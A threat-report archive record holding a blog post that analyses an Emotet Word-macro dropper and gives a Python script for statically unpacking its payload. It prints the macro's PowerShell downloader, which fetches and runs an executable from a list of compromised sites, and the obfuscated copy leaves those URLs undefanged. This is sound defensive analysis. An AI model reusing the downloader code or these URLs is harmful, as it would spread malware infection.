{
    "id": "9f6ee206-333b-4bb1-85ba-87451b7fad2b",
    "created_at": "2023-01-12T15:06:53.686898Z",
    "updated_at": "2025-03-27T02:05:50.928819Z",
    "deleted_at": null,
    "sha1_hash": "750e9c55ca0fdd66b599bdf28f75b24b51018e0d",
    "title": "2020-11-22 - Analyzing an Emotet Dropper and Writing a Python Script to Statically Unpack Payload.",
    "authors": "",
    "file_creation_date": "2022-05-28T16:16:02Z",
    "file_modification_date": "2022-05-28T16:16:02Z",
    "file_size": 846764,
    "plain_text": "# Analyzing an Emotet Dropper and Writing a Python Script to Statically Unpack Payload.\n\n**mirshadx.wordpress.com/2020/11/22/analyzing-an-emotet-dropper-and-writing-a-python-script-to-statically-unpack-**\npayload/\n\nNovember 22, 2020\n\nIn this blog post, we will analyze an Emotet dropper. The sample used in this post is\n[available on any.run here. Details of the sample are](https://app.any.run/tasks/3363fde4-111b-4aaa-b73d-e4144433c284/#)\n\n```\nMD5: b92021ca10aed3046fc3be5ac1c2a094\n\n```\n```\nFilename: emotet.doc\n\n```\n\nWhen you open the file in MS Word, you will be greeted with social engineering message\nasking you to enable the Macros.\n\nLet’s extract the Macros. There are multiple tools that can accomplish this, but my favorite\none is `olevba . The` [extracted Macro is uploaded here on gist. Macro code is heavily](https://gist.github.com/irshadqemu/92354f94b55780c2db56fa6696ec07db)\nobfuscated. However, there are some lines that stand out. (Line numbers are the same as\nthe code on gist.)\n```\nGS0LWK = zqzYlm3 + ThisDocument.McQHX3.Caption + \nThisDocument.PWo3kW.Caption + ThisDocument.psYO9m.Caption + UR1S3b\nRcTkkOqw = CreateObject(Replace(\"w  i   nm  gmts:Win  32  _Pr  ocess\",\n\" \", \"\")).Create(GS0LWK + IEHlwRq, W8KjQY, u0rrBWd, l78zbRfV)\n\n```\n\n-----\n\nAt line 62 it prepares a string `GS0LWK, and then use it as a parameter to`\n```\nwinmgmts:Win32_Process.Create on line 88, which is used to create a new process.\nGS0LWK will be the command-line of the new process. Now we can set up a breakpoint on\n\n```\nline 88 and debug the Macro to see what process is being created\n\nThe figure above shows it will create a Powershell Process with Base64 encoded code. We\ncan copy the command line from variable `GS0WLK, or using any process manager such as`\n`procexp` or Process Hacker. It is also available on any.run link shared at the start of the\nblog. So Macro will create the following PowerShell process.\n```\npowershell -enco\nJABqAHIARgBoAEEAMAA9ACcAVwBmADEAcgBIAHoAJwA7ACQAdQBVAE0ATQBMAEkAIAA9ACAAJwAyADgANAAnAD\n\n```\nAfter Base64 decoding the code looks like this\n```\n$jrFhA0='Wf1rHz';$uUMMLI =\n'284';$iBtj49N='ThMqW8s0';$FwcAJs6=$env:userprofile+'\\'+$uUMMLI+'.exe';$S9GzRstM='EFCw\n('n'+'ew'+'-object') NeT.wEBClIEnt;$pLjBqINE='http://blockchainjoblist.com/wpadmin/014080/@https://womenempowermentpakistan.com/wpadmin/paba5q52/@https://atnimanvilla.com/wpcontent/073735/@https://yeuquynhnhai.com/upload/41830/@https://deepikarai.com/js/4bzs6\n('@');$l4sJloGw='zISjEmiP';foreach($V3hEPMMZ in $pLjBqINE)\n{try{$u8UAr3.\"DOw`N`lOaDfi`Le\"($V3hEPMMZ, $FwcAJs6);$IvHHwRib='s5Ts_iP8';If ((&\n('G'+'e'+'t-Item') $FwcAJs6).\"LeN`gTh\" -ge 23931) {[Diagnostics.Process]::\"ST`ArT\"\n($FwcAJs6);$zDNs8wi='F3Wwo0';break;$TTJptXB='ijlWhCzP'}}catch{}}$vZzi_uAp='aEBtpj4'\n\n```\nThe de-obfuscated PowerShell code would look this. (I have defanged the URLs)\n\n$jrFhA0='Wf1rHz'\n\n$uUMMLI = '284'\n\n$iBtj49N='ThMqW8s0'\n\n$FwcAJs6=$env:userprofile+'\\'+$uUMMLI+'.exe'\n\n$S9GzRstM='EFCwnlGz'\n\n$u8UAr3=&('new-object') NeT.wEBClIEnt\n\n$pLjBqINE='http[:]//blockchainjoblist[.]com/wp-admin/014080/\n\n\n-----\n\n@ https[:]//womenempowermentpakistan[.]com/wp-admin/paba5q52/\n\n@ https[:]//atnimanvilla[.]com/wp-content/073735/\n\n@ https[:]//yeuquynhnhai[.]com/upload/41830/\n\n@ https[:]//deepikarai[.]com/js/4bzs6/'.\"sPLiT\"('@')\n\n$l4sJloGw='zISjEmiP'\n\nforeach($V3hEPMMZ in $pLjBqINE)\n\n{\n\ntry\n\n{\n\n$u8UAr3.\"DOwNlOaDfiLe\"($V3hEPMMZ, $FwcAJs6)\n\n$IvHHwRib='s5Ts_iP8'\n\nIf ((&('Get-Item') $FwcAJs6).\"LeNgTh\" -ge 23931)\n\n{\n\n[Diagnostics.Process]::\"STArT\"($FwcAJs6)\n\n$zDNs8wi='F3Wwo0'\n\nbreak\n\n$TTJptXB='ijlWhCzP'\n\n}\n\n}\n\ncatch\n\n{}\n\n}\n\n$vZzi_uAp='aEBtpj4'\n\n[view raw](https://gist.github.com/irshadqemu/a7460005b00b05a184e9d30b8c839c69/raw/b89b9fb272e03f4c9d06bf18bfb67a5f032f2918/de-obfuscated-ps.ps1) [de-obfuscated-ps.ps1 hosted with ❤ by](https://gist.github.com/irshadqemu/a7460005b00b05a184e9d30b8c839c69#file-de-obfuscated-ps-ps1) [GitHub](https://github.com/)\nThis shellcode will download an executable from one of the URLs in the array\n\n“ $pLjBqINE “, save it to the path “ %UserProfile%\\284.exe\", check if its size is greater\nthan or equal to 23931 bytes, and execute it.\n\n\n-----\n\n## Analysis of Second Stage Exe (284.exe)\n\n[284.exe can be downloaded from any.run. Let’s see if it is packed with any known packer.](https://app.any.run/tasks/3363fde4-111b-4aaa-b73d-e4144433c284/#)\nExeinfo PE is unable to find any known packer.\n\nHowever, `Detect it easy finds that it is an MFC application`\n\nwith high entropy and status `packed . Most likely, it is packed with a custom MFC Packer.`\n\nWhen I open the file in IDA-PRO and look at the `imports, shown below, it is filled with junk`\nimports. So, yup Exe is packed.\n\n\n-----\n\nUsually, to further analyze these types of files, either I run them in a sandbox, or run them\nwith a tracer tool, such as tiny_tracer, and look for interesting API calls. When I run the\n284.exe with tiny_tracer, at the end of the API log file, I see an interesting API call sequence.\n\nIt seems like, it is loading some resource, decrypting it, allocating new space to copy the\ndecrypted code, and then executing it. Set a breakpoint on FindResourceA in a debugger,\nexecute it till return, and it will land you in this unpacking function. You can use `ida_fl plugin`\n\n\n-----\n\nto load .tag file in IDA Pro.\n**Unpacking function analysis**\nIt will load the `KITTKOF resource in memory`\n\nThe resource hacker shows `KITKOFF resource. It seems to be encrypted.`\n\nThen packer will decode the shellcode from Base64+ RC4 encrypted string that will in turn\ndecrypt the resource.\n\n\n-----\n\nThe RC4 algorithm, shown as `CustomRC4, it uses to decrypt the is slightly modified from`\nthe standard version. It uses `N=0x1E1, instead of the standard` `N=0x100 . It is shown`\nbelow.\n\n\n-----\n\nThen the malware calls the shellcode twice and passes `Resrouce Size,` `Pointer to`\n```\nloaded resource data, an integer, and string as parameters. Nothing happens in\n\n```\nthe first call. However, the second call decrypts the resource.\n\n**Analysis Of Shellcode**\n\nLike any other shellcode, at first, it resolves the `LoadLibraryA and` `GetProcAddress`\nusing API hashes as shown below.\n\nThen it prepares the following WINAPI strings on the stack, and dynamically resolves them\n\n– `CryptAcquireContextA`\n\n– `CryptImportKey`\n\n\n-----\n\n– `CryptEncrypt`\nan example is shown below\n\n[The shellcode then prepares two PUBLICKEYSTRUC key blobs on the stack,](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/ns-wincrypt-publickeystruc)\nOne for `RSA` with `ALG_ID of` `CALG_RSA_KEYX(0x0000a400)`\n\nOther for `RC4 with` `ALG_ID of` `CALG_RC4` `(0x00006801)`\n\nThe shellcode imports both of these key blobs using `CryptImportKey . However, it only`\nupdates the key in RC4 one, and use that to decrypt resource data. The corresponding API\ncall is shown below. We can analyze the `pbData parameter, which is of type`\n```\n PUBLICKEYSTRUC to find the key used.\n\n```\n\n-----\n\n```\npdData data is shown below with key highlighted. If notice, this key was passed as the first\n\n```\nparameter while calling the shellcode.\n\nFinally, the shellcode calls CrypteEncrypt and decrypts the Resource data. The decrypted\ndata is shown below. That is another layer of shellcode. (why? hint: `call $+5 )`\n\nIf you scroll down a little, you will find a PE file is also present in decrypted data.\n\n\n-----\n\n[I have analyzed the next layer of shellcode, it just reflectively loads the embedded PE file. So](https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/)\nwe can dump decrypted resource data and carve out PE files using Exeinfo-PE or some\nother tools. Exeinfo PE extracted two files\n\n1. `DLL (bf3af6a558366d3927bfe5a9b471d56a1387b4927a418c428fc3452721b5c757)`\n2. `Exe (f96d6bbf4b0da81c688423f2e1fc3df4b4ef970f91cfd6230a5c5f45bb7e41bd)`\n\nBoth of these files are already detected by existing open source Emotet Yara sigs.\n\nSo we have reached the final payload of Emotet. Let’s see if we can write a script to statically\nunpack and extract the payload.\n\n## Writing a Python Script to Unpack Malware Statically\n\nWe can write a python script to unpack `284.exe statically by`\n\nExtract binary data from resource with name `KITTOFF`\nRC4 decrypt it using key `\"?UPLkTcdjlHrhAW\\x00\"`\nCarve out PE files from the decrypted binary data stream.\n\n\n-----\n\nThe code is pretty self-explanatory. If you have any questions please let me know in\ncomments.\n\n#!/usr/bin/env python3\n\n# Name:\n\n# unpack_emotet.py\n\n# Description:\n\n# This script accompanies my blog at\n\n# https://mirshadx.wordpress.com/2020/11/22/analyzing-an-emotet-dropper-and-writinga-python-script-to-statically-unpack-payload/\n\n# and can be used to statically unpack given sample in the blog\n\n# Author:\n\n# [https://twitter.com/mirshadx](https://twitter.com/mirshadx)\n\n# [https://www.linkedin.com/in/irshad-muhammad-3020b0a5/](https://www.linkedin.com/in/irshad-muhammad-3020b0a5/)\n\n#\n\n# PE carving code is adopted from https://github.com/MalwareLu/tools/blob/master/pecarv.py\n\n#\n\nimport pefile\n\nfrom Crypto.Cipher import ARC4\n\nimport re\n\n# if you like, you can use commandline args for these arguments\n\nEXE_PATH = \"C:\\\\Users\\\\user\\\\Downloads\\\\tmp\\\\284.bin\"\n\nRC4_KEY = b\"?UPLkTcdjlHrhAW\\x00\"\n\nRESOURCE_NAME = \"KITTKOF\"\n\ndef get_resource_data(path_to_exe, resource_name):\n\n\"\"\"Given a resource name extracts binary data for it\"\"\"\n\n\n-----\n\npe = pefile.PE(path_to_exe)\n\nfor rsrc in pe.DIRECTORY_ENTRY_RESOURCE.entries:\n\nif str(rsrc.name) == resource_name:\n\nprint(\"Found the resource with name KITTOFF\")\n\n# Get IMAGE_RESOURCE_DATA_ENTRY for resource and extract data\n\ndata_struc = rsrc.directory.entries[0].directory.entries[0].data.struct\n\ndata_size = data_struc.Size\n\ndata_offset = data_struc.OffsetToData\n\nprint(f\"Rosource Size: {hex(data_size)}, Resource Offset:{hex(data_offset)}\")\n\nrsrc_data = pe.get_memory_mapped_image()[data_offset: data_offset + data_size]\n\nreturn rsrc_data\n\nraise ValueError(f\"Unable to find resource with name: {resource_name}\")\n\ndef rc4_decrypt_data(enc_data, key):\n\n\"\"\"RC4 decrypts the encrypted data\"\"\"\n\ncipher = ARC4.new(RC4_KEY)\n\ndec_data = cipher.decrypt(enc_data)\n\nreturn dec_data\n\ndef get_extension(pe):\n\n\"\"\"returns ext of the file type using pefile\"\"\"\n\nif pe.is_dll():\n\nreturn \".dll_\"\n\nif pe.is_driver():\n\nreturn \".sys_\"\n\nif pe.is_exe():\n\n\n-----\n\nreturn \".exe_\"\n\nelse:\n\nreturn \".bin_\"\n\ndef write_pe_file_disk(pe, c):\n\n\"\"\"Writes a PE file to disk\"\"\"\n\ntrimmed_pe = pe.trim()\n\npe_name = str(c)+get_extension(pe)\n\nout = open(pe_name, \"wb\")\n\nout.write(trimmed_pe)\n\nout.close()\n\nprint(f\"PE file: {pe_name} written to disk\")\n\ndef carve_pe_file(data_stream):\n\n\"\"\"carve out pe file from binary data stream\"\"\"\n\nc = 1\n\nfor y in [tmp.start() for tmp in re.finditer(b\"\\x4d\\x5a\", data_stream)]:\n\nlocation = y\n\ntry:\n\npe = pefile.PE(data=data_stream[y:])\n\nexcept:\n\nprint(f\"MZ header found at {hex(y)} but failed to parse it as PE\")\n\ncontinue\n\nprint(f\"Found PE at offset: {hex(y)}\")\n\nwrite_pe_file_disk(pe, c)\n\n\n-----\n\nif __name__ == '__main__':\n\nrsrc_data = get_resource_data(EXE_PATH, RESOURCE_NAME)\n\ndec_data = rc4_decrypt_data(rsrc_data, RC4_KEY)\n\ncarve_pe_file(dec_data)\n\n[view raw](https://gist.github.com/irshadqemu/ac67f55d7d4dc96d374ca0f800410f64/raw/b47e278d97a639e7a3d85f84845d338f10827909/unpack_emotet.py) [unpack_emotet.py hosted with ❤ by](https://gist.github.com/irshadqemu/ac67f55d7d4dc96d374ca0f800410f64#file-unpack_emotet-py) [GitHub](https://github.com/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-22 - Analyzing an Emotet Dropper and Writing a Python Script to Statically Unpack Payload..pdf"
    ],
    "report_names": [
        "2020-11-22 - Analyzing an Emotet Dropper and Writing a Python Script to Statically Unpack Payload..pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536013,
    "ts_updated_at": 1743041150,
    "ts_creation_date": 1653754562,
    "ts_modification_date": 1653754562,
    "files": {
        "pdf": "https://archive.orkl.eu/750e9c55ca0fdd66b599bdf28f75b24b51018e0d.pdf",
        "text": "https://archive.orkl.eu/750e9c55ca0fdd66b599bdf28f75b24b51018e0d.txt",
        "img": "https://archive.orkl.eu/750e9c55ca0fdd66b599bdf28f75b24b51018e0d.jpg"
    }
}